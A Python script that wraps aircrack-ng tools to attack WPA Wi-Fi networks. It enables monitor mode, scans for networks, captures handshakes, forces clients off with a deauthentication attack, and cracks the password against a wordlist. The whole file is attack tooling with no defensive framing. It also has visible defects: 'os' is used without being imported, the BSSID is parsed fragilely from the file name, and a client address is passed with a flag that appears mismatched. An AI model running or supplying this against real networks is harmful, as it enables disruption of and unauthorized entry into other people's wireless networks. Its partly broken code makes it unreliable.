import subprocess
import time
import re
from threading import Thread

def enable_monitor_mode(iface):
    """Enable monitor mode using airmon-ng"""
    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                      check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        result = subprocess.run(['sudo', 'airmon-ng', 'start', iface], 
                               capture_output=True, text=True)
        if "monitor mode enabled" in result.stdout:
            new_iface = re.findall(r"\((.*?)\)", result.stdout)[-1]
            print(f"[+] Monitor mode enabled on {new_iface}")
            return new_iface
        print("[-] Failed to enable monitor mode")
        return None
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return None

def scan_networks(iface, duration=10):
    """Scan for networks using airodump-ng"""
    try:
        print(f"[+] Scanning networks on {iface}...")
        proc = subprocess.Popen(['sudo', 'airodump-ng', iface], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
        return True
    except Exception as e:
        print(f"[-] Scan failed: {str(e)}")
        return False

def capture_handshake(iface, bssid, channel, output_file):
    """Capture WPA handshake using airodump-ng"""
    try:
        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', channel,
            '--write', output_file,
            iface
        ]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return proc
    except Exception as e:
        print(f"[-] Handshake capture failed: {str(e)}")
        return None

def deauth_attack(iface, bssid, client='FF:FF:FF:FF:FF:FF', count=3):
    """Perform deauthentication attack"""
    try:
        cmd = [
            'sudo', 'aireplay-ng',
            '--deauth', str(count),
            '-a', bssid,
            '-h', client,
            iface
        ]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Deauthentication packets sent")
        return True
    except Exception as e:
        print(f"[-] Deauth failed: {str(e)}")
        return False

def crack_handshake(cap_file, wordlist):
    """Crack WPA handshake using aircrack-ng"""
    try:
        cmd = [
            'sudo', 'aircrack-ng',
            '-w', wordlist,
            '-b', os.path.basename(cap_file).split('-')[1],
            cap_file + '-01.cap'
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if "KEY FOUND!" in result.stdout:
            key = re.search(r'\[(.*?)\]', result.stdout).group(1)
            print(f"[+] Password found: {key}")
            return key
        print("[-] Password not found in wordlist")
        return None
    except Exception as e:
        print(f"[-] Cracking failed: {str(e)}")
        return None
